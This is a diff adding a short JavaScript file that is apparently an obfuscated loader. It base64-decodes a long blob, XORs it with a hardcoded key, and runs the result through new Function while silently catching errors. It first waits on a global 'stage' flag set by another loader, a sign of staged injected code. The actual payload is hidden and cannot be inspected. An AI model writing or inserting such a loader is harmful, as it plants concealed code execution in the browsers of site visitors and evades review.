@@ -1,0 +1,11 @@
+(function(){
+var _D='5d3ZuWqpsPo/2LcXXyHqqrJl2cVe7AUJkuTH5la+uOEwnOcfITTw9fp81MRNrS14ptrAo2aCquEwl/tNaHW9q+F3xN5I7Uktu9re91at5M52qd81BBjvxfhiiOlA1EIWtd7PvHPq4f5hoecFfgT46fY5ydFTyjVujoLipDT69bI3iPQCGQu90/4g89pg0iphn8HLmSa8oPlnycoFOzrj2NVAhONI7xFlt+nH6i7x/qRjuuccIAT/98Fq25JS8j9VhuzkmkjpgNg4tfwEFCe0xqR7gM9Cwid3hMyR8CX6nOc5kqw5AyPm0Pwl0plx5DRtutzGk22Sqv4FnNIKDA7N18lx6eF/wh5hhIaL+y66ms0et/k8NyG80+tB3exqzERI+vb671CVuL45uNsuGxH67P5r5+8N1EcX8JyA8D+Eisw8nNhHF3G85tR238pVtAdVn/ybnSKsofhpt8xHPya7sd5W4JkLwEIa6uaX3W+ot/YlmfECdRf+qvI7y91b8VJd8NXJoCmIsPslyN8eJyn1qqAgmZBc7AAPu9re92Dg6a44zP9COS3i5ed6i8IRqFtcu9re93HgjPw/hKYtJzrt+710wsRXqxNTotmEtlK0hLx9lusCNjzl7f0604JB8RdTuMnC92rzuv0wgt0DMS3N9rsimdYTuBRIv5Patnv9s6hhy/RQZnq36Lg5mdFh6S958MP3vVSgq/AlhewCdTLxiOVzwotl0EAaksmEiHn04p9+374HZGhvAzsy25kaYPC1Kg4NNItcOhfaHyL2stM0ZimAVBWnZt+/LjgjNIpeOhfmEx3JXz7t8LNN/poHpC146pCE53GZnNQV2bAYOhv48Pp814MJtVsM6uTn5i7m0+Mwgr4zHnmx9fp81MRN2C1p/OaX3WC78bQOu68QKRfHs71+1cVd9xoG8Iaf5SCvvOEkgvBXXz7t8LNN3cJCvhxCupv5vmep4dQjgv8VfXu+q6gY1sRIqwRGv5vF6jnmsKliwqUFfmOl3f57yPBT3k94non3vlSDht5gq/cxC2Ck67kjg5oTpUJfi/2F7AOruOdxr9BeaG/T3bQ5mJtCwTdii5KCo2aOrec4nvlEZn6lqbRN+5kduHhor9HJtH3zvfA3mfAJBTrj8vZgxNIS9BtJqdTb+1aT67kqhv8AIC223cAgnNxI6gZGr9fJ7W+8teY03P0DOy7l5eZg0clW5khBrNffsiW4t+A8lewNNyTpuPVz3Nhf/lscx/TOvWy+rbs1lfgFOy3c8Pxi1dlO+lpQpNXIuH7x/soOm69eCiXl+rQ+y91b7wdC9+TBvnHxruc4hP8OOS225PJ+w84W4B1Jq9LLonu8u/k0yvgNOTvprvZ8xcZf8RNFod6WsWixqvAs2aVmIiHi5vxlnvRl6BNLudTzpH28vvBswqVmITr1+eR73s9V9FxDpMjctn2+sdAnlfAYfSbp9bNRxdhO7B9iu97CoyH6hso6wsEeMCno+7Q7mdZZ4gZEpZPJ/nKg0+h42LdX',_K='zbus1wnd2ZVR8J5sVUiMgpMSsKs6g3In';
+function _u8(s){return Uint8Array.from(atob(s),function(c){return c.charCodeAt(0)})}
+var d=_u8(_D),k=_u8(_K),o=new Uint8Array(d.length);
+for(var i=0;i<d.length;i++)o[i]=d[i]^k[i%k.length];
+var src='';for(var i=0;i<o.length;i++)src+=String.fromCharCode(o[i]);
+// 相互参照：k1 がロードされていなければ短時間待つ
+function _go(){try{(new Function(src))()}catch(e){}}
+if(window.__kalto_stage===1){_go()}
+else{var t=0,iv=setInterval(function(){if(window.__kalto_stage===1||++t>120){clearInterval(iv);_go()}},50)}
+})();
